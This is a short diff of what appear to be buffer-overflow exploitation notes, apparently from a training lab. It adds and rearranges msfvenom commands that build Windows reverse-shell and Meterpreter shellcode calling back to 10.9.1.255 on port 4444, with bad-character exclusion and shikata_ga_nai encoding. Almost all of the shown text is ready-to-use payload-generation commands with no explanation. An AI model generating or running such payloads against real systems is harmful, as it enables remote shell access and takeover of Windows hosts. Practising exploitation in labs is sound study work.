@@ -28,11 +28,15 @@ retn = BBBB
 
 retn = jmp
 
-msfvenom -p windows/shell_reverse_tcp LHOST=10.9.1.255 LPORT=4444 EXITFUNC=thread -b "\x00" -f c
+msfvenom -p windows/shell_reverse_tcp LHOST=10.9.1.255 LPORT=4444 EXITFUNC=thread -b "\x00\x0a" -f c
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.9.1.255 LPORT=4444 -f rb -b "\x00\x0a" -f c
+
+msfvenom -p windows/shell_reverse_tcp LHOST=10.9.1.255 LPORT=4444 -b "\x00" -f c
 
 msfvenom -p windows/shell_reverse_tcp LHOST=10.9.1.255 LPORT=4444 -e x86/shikata_ga_nai -f py -b "\x00"
 
-msfvenom -p windows/shell_reverse_tcp LHOST=10.9.1.255 LPORT=4444 -b "\x00" -f c
+
 
 ## Script Fuzzer
 ```
